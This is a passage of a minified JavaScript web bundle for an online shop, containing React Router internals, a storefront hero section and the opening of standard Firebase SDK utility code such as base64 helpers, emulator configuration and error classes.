 */function Fl(){return Fl=Object.assign?Object.assign.bind():function(t){for(var e=1;e<arguments.length;e++){var n=arguments[e];for(var r in n)Object.prototype.hasOwnProperty.call(n,r)&&(t[r]=n[r])}return t},Fl.apply(this,arguments)}const Cv=v.createContext(null),dD=v.createContext(null),Ds=v.createContext(null),Eh=v.createContext(null),Yi=v.createContext({outlet:null,matches:[],isDataRoute:!1}),D1=v.createContext(null);function hD(t,e){let{relative:n}=e===void 0?{}:e;cc()||Xe(!1);let{basename:r,navigator:i}=v.useContext(Ds),{hash:s,pathname:o,search:a}=M1(t,{relative:n}),c=o;return r!=="/"&&(c=o==="/"?r:Si([r,o])),i.createHref({pathname:c,search:a,hash:s})}function cc(){return v.useContext(Eh)!=null}function ta(){return cc()||Xe(!1),v.useContext(Eh).location}function j1(t){v.useContext(Ds).static||v.useLayoutEffect(t)}function uc(){let{isDataRoute:t}=v.useContext(Yi);return t?TD():fD()}function fD(){cc()||Xe(!1);let t=v.useContext(Cv),{basename:e,future:n,navigator:r}=v.useContext(Ds),{matches:i}=v.useContext(Yi),{pathname:s}=ta(),o=JSON.stringify(R1(i,n.v7_relativeSplatPath)),a=v.useRef(!1);return j1(()=>{a.current=!0}),v.useCallback(function(u,p){if(p===void 0&&(p={}),!a.current)return;if(typeof u=="number"){r.go(u);return}let f=A1(u,JSON.parse(o),s,p.relative==="path");t==null&&e!=="/"&&(f.pathname=f.pathname==="/"?e:Si([e,f.pathname])),(p.replace?r.replace:r.push)(f,p.state,p)},[e,r,o,s,t])}function pD(){let{matches:t}=v.useContext(Yi),e=t[t.length-1];return e?e.params:{}}function M1(t,e){let{relative:n}=e===void 0?{}:e,{future:r}=v.useContext(Ds),{matches:i}=v.useContext(Yi),{pathname:s}=ta(),o=JSON.stringify(R1(i,r.v7_relativeSplatPath));return v.useMemo(()=>A1(t,JSON.parse(o),s,n==="path"),[t,o,s,n])}function mD(t,e){return gD(t,e)}function gD(t,e,n,r){cc()||Xe(!1);let{navigator:i}=v.useContext(Ds),{matches:s}=v.useContext(Yi),o=s[s.length-1],a=o?o.params:{};o&&o.pathname;let c=o?o.pathnameBase:"/";o&&o.route;let u=ta(),p;if(e){var f;let C=typeof e=="string"?ea(e):e;c==="/"||(f=C.pathname)!=null&&f.startsWith(c)||Xe(!1),p=C}else p=u;let h=p.pathname||"/",E=h;if(c!=="/"){let C=c.replace(/^\//,"").split("/");E="/"+h.replace(/^\//,"").split("/").slice(C.length).join("/")}let _=VO(t,{pathname:E}),y=xD(_&&_.map(C=>Object.assign({},C,{params:Object.assign({},a,C.params),pathname:Si([c,i.encodeLocation?i.encodeLocation(C.pathname).pathname:C.pathname]),pathnameBase:C.pathnameBase==="/"?c:Si([c,i.encodeLocation?i.encodeLocation(C.pathnameBase).pathname:C.pathnameBase])})),s,n,r);return e&&y?v.createElement(Eh.Provider,{value:{location:Fl({pathname:"/",search:"",hash:"",state:null,key:"default"},p),navigationType:pi.Pop}},y):y}function vD(){let t=bD(),e=cD(t)?t.status+" "+t.statusText:t instanceof Error?t.message:JSON.stringify(t),n=t instanceof Error?t.stack:null,i={padding:"0.5rem",backgroundColor:"rgba(200,200,200, 0.5)"};return v.createElement(v.Fragment,null,v.createElement("h2",null,"Unexpected Application Error!"),v.createElement("h3",{style:{fontStyle:"italic"}},e),n?v.createElement("pre",{style:i},n):null,null)}const yD=v.createElement(vD,null);class _D extends v.Component{constructor(e){super(e),this.state={location:e.location,revalidation:e.revalidation,error:e.error}}static getDerivedStateFromError(e){return{error:e}}static getDerivedStateFromProps(e,n){return n.location!==e.location||n.revalidation!=="idle"&&e.revalidation==="idle"?{error:e.error,location:e.location,revalidation:e.revalidation}:{error:e.error!==void 0?e.error:n.error,location:n.location,revalidation:e.revalidation||n.revalidation}}componentDidCatch(e,n){console.error("React Router caught the following error during render",e,n)}render(){return this.state.error!==void 0?v.createElement(Yi.Provider,{value:this.props.routeContext},v.createElement(D1.Provider,{value:this.state.error,children:this.props.component})):this.props.children}}function wD(t){let{routeContext:e,match:n,children:r}=t,i=v.useContext(Cv);return i&&i.static&&i.staticContext&&(n.route.errorElement||n.route.ErrorBoundary)&&(i.staticContext._deepestRenderedBoundaryId=n.route.id),v.createElement(Yi.Provider,{value:e},r)}function xD(t,e,n,r){var i;if(e===void 0&&(e=[]),n===void 0&&(n=null),r===void 0&&(r=null),t==null){var s;if(!n)return null;if(n.errors)t=n.matches;else if((s=r)!=null&&s.v7_partialHydration&&e.length===0&&!n.initialized&&n.matches.length>0)t=n.matches;else return null}let o=t,a=(i=n)==null?void 0:i.errors;if(a!=null){let p=o.findIndex(f=>f.route.id&&(a==null?void 0:a[f.route.id])!==void 0);p>=0||Xe(!1),o=o.slice(0,Math.min(o.length,p+1))}let c=!1,u=-1;if(n&&r&&r.v7_partialHydration)for(let p=0;p<o.length;p++){let f=o[p];if((f.route.HydrateFallback||f.route.hydrateFallbackElement)&&(u=p),f.route.id){let{loaderData:h,errors:E}=n,_=f.route.loader&&h[f.route.id]===void 0&&(!E||E[f.route.id]===void 0);if(f.route.lazy||_){c=!0,u>=0?o=o.slice(0,u+1):o=[o[0]];break}}}return o.reduceRight((p,f,h)=>{let E,_=!1,y=null,C=null;n&&(E=a&&f.route.id?a[f.route.id]:void 0,y=f.route.errorElement||yD,c&&(u<0&&h===0?(_=!0,C=null):u===h&&(_=!0,C=f.route.hydrateFallbackElement||null)));let x=e.concat(o.slice(0,h+1)),w=()=>{let S;return E?S=y:_?S=C:f.route.Component?S=v.createElement(f.route.Component,null):f.route.element?S=f.route.element:S=p,v.createElement(wD,{match:f,routeContext:{outlet:p,matches:x,isDataRoute:n!=null},children:S})};return n&&(f.route.ErrorBoundary||f.route.errorElement||h===0)?v.createElement(_D,{location:n.location,revalidation:n.revalidation,component:y,error:E,children:w(),routeContext:{outlet:null,matches:x,isDataRoute:!0}}):w()},null)}var L1=function(t){return t.UseBlocker="useBlocker",t.UseRevalidator="useRevalidator",t.UseNavigateStable="useNavigate",t}(L1||{}),xd=function(t){return t.UseBlocker="useBlocker",t.UseLoaderData="useLoaderData",t.UseActionData="useActionData",t.UseRouteError="useRouteError",t.UseNavigation="useNavigation",t.UseRouteLoaderData="useRouteLoaderData",t.UseMatches="useMatches",t.UseRevalidator="useRevalidator",t.UseNavigateStable="useNavigate",t.UseRouteId="useRouteId",t}(xd||{});function ED(t){let e=v.useContext(Cv);return e||Xe(!1),e}function CD(t){let e=v.useContext(dD);return e||Xe(!1),e}function SD(t){let e=v.useContext(Yi);return e||Xe(!1),e}function F1(t){let e=SD(),n=e.matches[e.matches.length-1];return n.route.id||Xe(!1),n.route.id}function bD(){var t;let e=v.useContext(D1),n=CD(xd.UseRouteError),r=F1(xd.UseRouteError);return e!==void 0?e:(t=n.errors)==null?void 0:t[r]}function TD(){let{router:t}=ED(L1.UseNavigateStable),e=F1(xd.UseNavigateStable),n=v.useRef(!1);return j1(()=>{n.current=!0}),v.useCallback(function(i,s){s===void 0&&(s={}),n.current&&(typeof i=="number"?t.navigate(i):t.navigate(i,Fl({fromRouteId:e},s)))},[t,e])}function os(t){Xe(!1)}function ID(t){let{basename:e="/",children:n=null,location:r,navigationType:i=pi.Pop,navigator:s,static:o=!1,future:a}=t;cc()&&Xe(!1);let c=e.replace(/^\/*/,"/"),u=v.useMemo(()=>({basename:c,navigator:s,static:o,future:Fl({v7_relativeSplatPath:!1},a)}),[c,a,s,o]);typeof r=="string"&&(r=ea(r));let{pathname:p="/",search:f="",hash:h="",state:E=null,key:_="default"}=r,y=v.useMemo(()=>{let C=Ev(p,c);return C==null?null:{location:{pathname:C,search:f,hash:h,state:E,key:_},navigationType:i}},[c,p,f,h,E,_,i]);return y==null?null:v.createElement(Ds.Provider,{value:u},v.createElement(Eh.Provider,{children:n,value:y}))}function ND(t){let{children:e,location:n}=t;return mD(km(e),n)}new Promise(()=>{});function km(t,e){e===void 0&&(e=[]);let n=[];return v.Children.forEach(t,(r,i)=>{if(!v.isValidElement(r))return;let s=[...e,i];if(r.type===v.Fragment){n.push.apply(n,km(r.props.children,s));return}r.type!==os&&Xe(!1),!r.props.index||!r.props.children||Xe(!1);let o={id:r.props.id||s.join("-"),caseSensitive:r.props.caseSensitive,element:r.props.element,Component:r.props.Component,index:r.props.index,path:r.props.path,loader:r.props.loader,action:r.props.action,errorElement:r.props.errorElement,ErrorBoundary:r.props.ErrorBoundary,hasErrorBoundary:r.props.ErrorBoundary!=null||r.props.errorElement!=null,shouldRevalidate:r.props.shouldRevalidate,handle:r.props.handle,lazy:r.props.lazy};r.props.children&&(o.children=km(r.props.children,s)),n.push(o)}),n}/**
 * React Router DOM v6.27.0
 *
 * Copyright (c) Remix Software Inc.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE.md file in the root directory of this source tree.
 *
 * @license MIT
 */function Pm(){return Pm=Object.assign?Object.assign.bind():function(t){for(var e=1;e<arguments.length;e++){var n=arguments[e];for(var r in n)Object.prototype.hasOwnProperty.call(n,r)&&(t[r]=n[r])}return t},Pm.apply(this,arguments)}function kD(t,e){if(t==null)return{};var n={},r=Object.keys(t),i,s;for(s=0;s<r.length;s++)i=r[s],!(e.indexOf(i)>=0)&&(n[i]=t[i]);return n}function PD(t){return!!(t.metaKey||t.altKey||t.ctrlKey||t.shiftKey)}function RD(t,e){return t.button===0&&(!e||e==="_self")&&!PD(t)}function Rm(t){return t===void 0&&(t=""),new URLSearchParams(typeof t=="string"||Array.isArray(t)||t instanceof URLSearchParams?t:Object.keys(t).reduce((e,n)=>{let r=t[n];return e.concat(Array.isArray(r)?r.map(i=>[n,i]):[[n,r]])},[]))}function AD(t,e){let n=Rm(t);return e&&e.forEach((r,i)=>{n.has(i)||e.getAll(i).forEach(s=>{n.append(i,s)})}),n}const OD=["onClick","relative","reloadDocument","replace","state","target","to","preventScrollReset","viewTransition"],DD="6";try{window.__reactRouterVersion=DD}catch{}const jD="startTransition",fw=NE[jD];function MD(t){let{basename:e,children:n,future:r,window:i}=t,s=v.useRef();s.current==null&&(s.current=$O({window:i,v5Compat:!0}));let o=s.current,[a,c]=v.useState({action:o.action,location:o.location}),{v7_startTransition:u}=r||{},p=v.useCallback(f=>{u&&fw?fw(()=>c(f)):c(f)},[c,u]);return v.useLayoutEffect(()=>o.listen(p),[o,p]),v.createElement(ID,{basename:e,children:n,location:a.location,navigationType:a.action,navigator:o,future:r})}const LD=typeof window<"u"&&typeof window.document<"u"&&typeof window.document.createElement<"u",FD=/^(?:[a-z][a-z0-9+.-]*:|\/\/)/i,de=v.forwardRef(function(e,n){let{onClick:r,relative:i,reloadDocument:s,replace:o,state:a,target:c,to:u,preventScrollReset:p,viewTransition:f}=e,h=kD(e,OD),{basename:E}=v.useContext(Ds),_,y=!1;if(typeof u=="string"&&FD.test(u)&&(_=u,LD))try{let S=new URL(window.location.href),N=u.startsWith("//")?new URL(S.protocol+u):new URL(u),R=Ev(N.pathname,E);N.origin===S.origin&&R!=null?u=R+N.search+N.hash:y=!0}catch{}let C=hD(u,{relative:i}),x=UD(u,{replace:o,state:a,target:c,preventScrollReset:p,relative:i,viewTransition:f});function w(S){r&&r(S),S.defaultPrevented||x(S)}return v.createElement("a",Pm({},h,{href:_||C,onClick:y||s?r:w,ref:n,target:c}))});var pw;(function(t){t.UseScrollRestoration="useScrollRestoration",t.UseSubmit="useSubmit",t.UseSubmitFetcher="useSubmitFetcher",t.UseFetcher="useFetcher",t.useViewTransitionState="useViewTransitionState"})(pw||(pw={}));var mw;(function(t){t.UseFetcher="useFetcher",t.UseFetchers="useFetchers",t.UseScrollRestoration="useScrollRestoration"})(mw||(mw={}));function UD(t,e){let{target:n,replace:r,state:i,preventScrollReset:s,relative:o,viewTransition:a}=e===void 0?{}:e,c=uc(),u=ta(),p=M1(t,{relative:o});return v.useCallback(f=>{if(RD(f,n)){f.preventDefault();let h=r!==void 0?r:wd(u)===wd(p);c(t,{replace:h,state:i,preventScrollReset:s,relative:o,viewTransition:a})}},[u,c,p,r,i,n,t,s,o,a])}function $D(t){let e=v.useRef(Rm(t)),n=v.useRef(!1),r=ta(),i=v.useMemo(()=>AD(r.search,n.current?null:e.current),[r.search]),s=uc(),o=v.useCallback((a,c)=>{const u=Rm(typeof a=="function"?a(i):a);n.current=!0,s("?"+u,c)},[s,i]);return[i,o]}const zD=_h("inline-flex items-center justify-center gap-2 whitespace-nowrap rounded-md text-sm font-medium ring-offset-background transition-colors focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 [&_svg]:pointer-events-none [&_svg]:size-4 [&_svg]:shrink-0",{variants:{variant:{default:"bg-primary text-primary-foreground hover:bg-primary/90",destructive:"bg-destructive text-destructive-foreground hover:bg-destructive/90",outline:"border border-input bg-background hover:bg-accent hover:text-accent-foreground",secondary:"bg-secondary text-secondary-foreground hover:bg-secondary/80",ghost:"hover:bg-accent hover:text-accent-foreground",link:"text-primary underline-offset-4 hover:underline"},size:{default:"h-10 px-4 py-2",sm:"h-9 rounded-md px-3",lg:"h-11 rounded-md px-8",icon:"h-10 w-10"}},defaultVariants:{variant:"default",size:"default"}}),oe=v.forwardRef(({className:t,variant:e,size:n,asChild:r=!1,...i},s)=>{const o=r?Fo:"button";return d.jsx(o,{className:fe(zD({variant:e,size:n,className:t})),ref:s,...i})});oe.displayName="Button";const BD=()=>d.jsxs("section",{className:"bg-accent relative overflow-hidden py-16 md:py-24",children:[d.jsx("div",{className:"container mx-auto px-4 md:px-8",children:d.jsxs("div",{className:"grid grid-cols-1 md:grid-cols-2 gap-12 items-center",children:[d.jsxs("div",{className:"animate-slide-up",children:[d.jsx("h1",{className:"text-4xl md:text-5xl lg:text-6xl font-serif font-medium mb-6 leading-tight",children:"Discover Your Perfect Style"}),d.jsx("p",{className:"text-lg text-gray-700 mb-8 max-w-md",children:"Curated collections and premium quality products that enhance your everyday life. Shop the latest trends."}),d.jsxs("div",{className:"flex flex-wrap gap-4",children:[d.jsx(oe,{asChild:!0,size:"lg",className:"rounded-full px-8",children:d.jsxs(de,{to:"/products",children:["Shop Now",d.jsx(a1,{size:16,className:"ml-2"})]})}),d.jsx(oe,{asChild:!0,size:"lg",variant:"outline",className:"rounded-full px-8",children:d.jsx(de,{to:"/products?category=new",children:"New Arrivals"})})]})]}),d.jsxs("div",{className:"relative h-[400px] md:h-[500px]",children:[d.jsx("div",{className:"absolute inset-0 bg-white/50 backdrop-blur-sm rounded-lg overflow-hidden shadow-2xl transform md:rotate-3 md:hover:rotate-0 transition-transform duration-500",children:d.jsx("img",{src:"https://images.unsplash.com/photo-1441986300917-64674bd600d8?q=80&w=3270&auto=format&fit=crop&ixlib=rb-4.0.3",alt:"Hero product showcase",className:"w-full h-full object-cover"})}),d.jsx("div",{className:"absolute -bottom-6 -left-6 w-40 h-40 md:w-60 md:h-60 rounded-full bg-primary/20 z-[-1]"}),d.jsx("div",{className:"absolute -top-6 -right-6 w-24 h-24 md:w-40 md:h-40 rounded-full bg-primary/10 z-[-1]"})]})]})}),d.jsx("div",{className:"bg-gradient-to-r from-primary/5 to-transparent h-24 absolute bottom-0 left-0 right-0 z-[-1]"})]}),Ie=(t,e,...n)=>{const r=new Date().toISOString();try{console.log(`[${r}][${t}] ${e}`,...n);{const i=document.getElementById("debug-log");if(i){const s=document.createElement("div");s.textContent=`[${r}][${t}] ${e} ${n.map(o=>JSON.stringify(o)).join(" ")}`,i.appendChild(s),i.children.length>50&&i.removeChild(i.children[0])}else{const s=document.createElement("div");s.id="debug-log",s.style.display="none",document.body.appendChild(s)}}}catch(i){console.error("Debug logger error:",i)}},VD=()=>{};var gw={};/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const U1={NODE_CLIENT:!1,NODE_ADMIN:!1,SDK_VERSION:"${JSCORE_VERSION}"};/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const B=function(t,e){if(!t)throw na(e)},na=function(t){return new Error("Firebase Database ("+U1.SDK_VERSION+") INTERNAL ASSERT FAILED: "+t)};/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const $1=function(t){const e=[];let n=0;for(let r=0;r<t.length;r++){let i=t.charCodeAt(r);i<128?e[n++]=i:i<2048?(e[n++]=i>>6|192,e[n++]=i&63|128):(i&64512)===55296&&r+1<t.length&&(t.charCodeAt(r+1)&64512)===56320?(i=65536+((i&1023)<<10)+(t.charCodeAt(++r)&1023),e[n++]=i>>18|240,e[n++]=i>>12&63|128,e[n++]=i>>6&63|128,e[n++]=i&63|128):(e[n++]=i>>12|224,e[n++]=i>>6&63|128,e[n++]=i&63|128)}return e},HD=function(t){const e=[];let n=0,r=0;for(;n<t.length;){const i=t[n++];if(i<128)e[r++]=String.fromCharCode(i);else if(i>191&&i<224){const s=t[n++];e[r++]=String.fromCharCode((i&31)<<6|s&63)}else if(i>239&&i<365){const s=t[n++],o=t[n++],a=t[n++],c=((i&7)<<18|(s&63)<<12|(o&63)<<6|a&63)-65536;e[r++]=String.fromCharCode(55296+(c>>10)),e[r++]=String.fromCharCode(56320+(c&1023))}else{const s=t[n++],o=t[n++];e[r++]=String.fromCharCode((i&15)<<12|(s&63)<<6|o&63)}}return e.join("")},Sv={byteToCharMap_:null,charToByteMap_:null,byteToCharMapWebSafe_:null,charToByteMapWebSafe_:null,ENCODED_VALS_BASE:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789",get ENCODED_VALS(){return this.ENCODED_VALS_BASE+"+/="},get ENCODED_VALS_WEBSAFE(){return this.ENCODED_VALS_BASE+"-_."},HAS_NATIVE_SUPPORT:typeof atob=="function",encodeByteArray(t,e){if(!Array.isArray(t))throw Error("encodeByteArray takes an array as a parameter");this.init_();const n=e?this.byteToCharMapWebSafe_:this.byteToCharMap_,r=[];for(let i=0;i<t.length;i+=3){const s=t[i],o=i+1<t.length,a=o?t[i+1]:0,c=i+2<t.length,u=c?t[i+2]:0,p=s>>2,f=(s&3)<<4|a>>4;let h=(a&15)<<2|u>>6,E=u&63;c||(E=64,o||(h=64)),r.push(n[p],n[f],n[h],n[E])}return r.join("")},encodeString(t,e){return this.HAS_NATIVE_SUPPORT&&!e?btoa(t):this.encodeByteArray($1(t),e)},decodeString(t,e){return this.HAS_NATIVE_SUPPORT&&!e?atob(t):HD(this.decodeStringToByteArray(t,e))},decodeStringToByteArray(t,e){this.init_();const n=e?this.charToByteMapWebSafe_:this.charToByteMap_,r=[];for(let i=0;i<t.length;){const s=n[t.charAt(i++)],a=i<t.length?n[t.charAt(i)]:0;++i;const u=i<t.length?n[t.charAt(i)]:64;++i;const f=i<t.length?n[t.charAt(i)]:64;if(++i,s==null||a==null||u==null||f==null)throw new WD;const h=s<<2|a>>4;if(r.push(h),u!==64){const E=a<<4&240|u>>2;if(r.push(E),f!==64){const _=u<<6&192|f;r.push(_)}}}return r},init_(){if(!this.byteToCharMap_){this.byteToCharMap_={},this.charToByteMap_={},this.byteToCharMapWebSafe_={},this.charToByteMapWebSafe_={};for(let t=0;t<this.ENCODED_VALS.length;t++)this.byteToCharMap_[t]=this.ENCODED_VALS.charAt(t),this.charToByteMap_[this.byteToCharMap_[t]]=t,this.byteToCharMapWebSafe_[t]=this.ENCODED_VALS_WEBSAFE.charAt(t),this.charToByteMapWebSafe_[this.byteToCharMapWebSafe_[t]]=t,t>=this.ENCODED_VALS_BASE.length&&(this.charToByteMap_[this.ENCODED_VALS_WEBSAFE.charAt(t)]=t,this.charToByteMapWebSafe_[this.ENCODED_VALS.charAt(t)]=t)}}};class WD extends Error{constructor(){super(...arguments),this.name="DecodeBase64StringError"}}const z1=function(t){const e=$1(t);return Sv.encodeByteArray(e,!0)},Ed=function(t){return z1(t).replace(/\./g,"")},Cd=function(t){try{return Sv.decodeString(t,!0)}catch(e){console.error("base64Decode failed: ",e)}return null};/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function KD(t){return B1(void 0,t)}function B1(t,e){if(!(e instanceof Object))return e;switch(e.constructor){case Date:const n=e;return new Date(n.getTime());case Object:t===void 0&&(t={});break;case Array:t=[];break;default:return e}for(const n in e)!e.hasOwnProperty(n)||!GD(n)||(t[n]=B1(t[n],e[n]));return t}function GD(t){return t!=="__proto__"}/**
 * @license
 * Copyright 2022 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function qD(){if(typeof self<"u")return self;if(typeof window<"u")return window;if(typeof global<"u")return global;throw new Error("Unable to locate global object.")}/**
 * @license
 * Copyright 2022 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const YD=()=>qD().__FIREBASE_DEFAULTS__,QD=()=>{if(typeof process>"u"||typeof gw>"u")return;const t=gw.__FIREBASE_DEFAULTS__;if(t)return JSON.parse(t)},XD=()=>{if(typeof document>"u")return;let t;try{t=document.cookie.match(/__FIREBASE_DEFAULTS__=([^;]+)/)}catch{return}const e=t&&Cd(t[1]);return e&&JSON.parse(e)},bv=()=>{try{return VD()||YD()||QD()||XD()}catch(t){console.info(`Unable to get __FIREBASE_DEFAULTS__ due to: ${t}`);return}},V1=t=>{var e,n;return(n=(e=bv())===null||e===void 0?void 0:e.emulatorHosts)===null||n===void 0?void 0:n[t]},Tv=t=>{const e=V1(t);if(!e)return;const n=e.lastIndexOf(":");if(n<=0||n+1===e.length)throw new Error(`Invalid host ${e} with no separate hostname and port!`);const r=parseInt(e.substring(n+1),10);return e[0]==="["?[e.substring(1,n-1),r]:[e.substring(0,n),r]},H1=()=>{var t;return(t=bv())===null||t===void 0?void 0:t.config},W1=t=>{var e;return(e=bv())===null||e===void 0?void 0:e[`_${t}`]};/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class dc{constructor(){this.reject=()=>{},this.resolve=()=>{},this.promise=new Promise((e,n)=>{this.resolve=e,this.reject=n})}wrapCallback(e){return(n,r)=>{n?this.reject(n):this.resolve(r),typeof e=="function"&&(this.promise.catch(()=>{}),e.length===1?e(n):e(n,r))}}}/**
 * @license
 * Copyright 2021 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function Iv(t,e){if(t.uid)throw new Error('The "uid" field is no longer supported by mockUserToken. Please use "sub" instead for Firebase Auth User ID.');const n={alg:"none",type:"JWT"},r=e||"demo-project",i=t.iat||0,s=t.sub||t.user_id;if(!s)throw new Error("mockUserToken must contain 'sub' or 'user_id' field!");const o=Object.assign({iss:`https://securetoken.google.com/${r}`,aud:r,iat:i,exp:i+3600,auth_time:i,sub:s,user_id:s,firebase:{sign_in_provider:"custom",identities:{}}},t);return[Ed(JSON.stringify(n)),Ed(JSON.stringify(o)),""].join(".")}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function Ot(){return typeof navigator<"u"&&typeof navigator.userAgent=="string"?navigator.userAgent:""}function Nv(){return typeof window<"u"&&!!(window.cordova||window.phonegap||window.PhoneGap)&&/ios|iphone|ipod|ipad|android|blackberry|iemobile/i.test(Ot())}function JD(){return typeof navigator<"u"&&navigator.userAgent==="Cloudflare-Workers"}function ZD(){const t=typeof chrome=="object"?chrome.runtime:typeof browser=="object"?browser.runtime:void 0;return typeof t=="object"&&t.id!==void 0}function K1(){return typeof navigator=="object"&&navigator.product==="ReactNative"}function ej(){const t=Ot();return t.indexOf("MSIE ")>=0||t.indexOf("Trident/")>=0}function G1(){return U1.NODE_ADMIN===!0}function tj(){try{return typeof indexedDB=="object"}catch{return!1}}function nj(){return new Promise((t,e)=>{try{let n=!0;const r="validate-browser-context-for-indexeddb-analytics-module",i=self.indexedDB.open(r);i.onsuccess=()=>{i.result.close(),n||self.indexedDB.deleteDatabase(r),t(!0)},i.onupgradeneeded=()=>{n=!1},i.onerror=()=>{var s;e(((s=i.error)===null||s===void 0?void 0:s.message)||"")}}catch(n){e(n)}})}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const rj="FirebaseError";class sr extends Error{constructor(e,n,r){super(n),this.code=e,this.customData=r,this.name=rj,Object.setPrototypeOf(this,sr.prototype),Error.captureStackTrace&&Error.captureStackTrace(this,hc.prototype.create)}}class hc{constructor(e,n,r){this.service=e,this.serviceName=n,this.errors=r}create(e,...n){const r=n[0]||{},i=`${this.service}/${e}`,s=this.errors[e],o=s?ij(s,r):"Error",a=`${this.serviceName}: ${o} (${i}).`;return new sr(i,a,r)}}function ij(t,e){return t.replace(sj,(n,r)=>{const i=e[r];return i!=null?String(i):`<${r}?>`})}const sj=/\{\$([^}]+)}/g;/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function Ul(t){return JSON.parse(t)}function tt(t){return JSON.stringify(t)}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
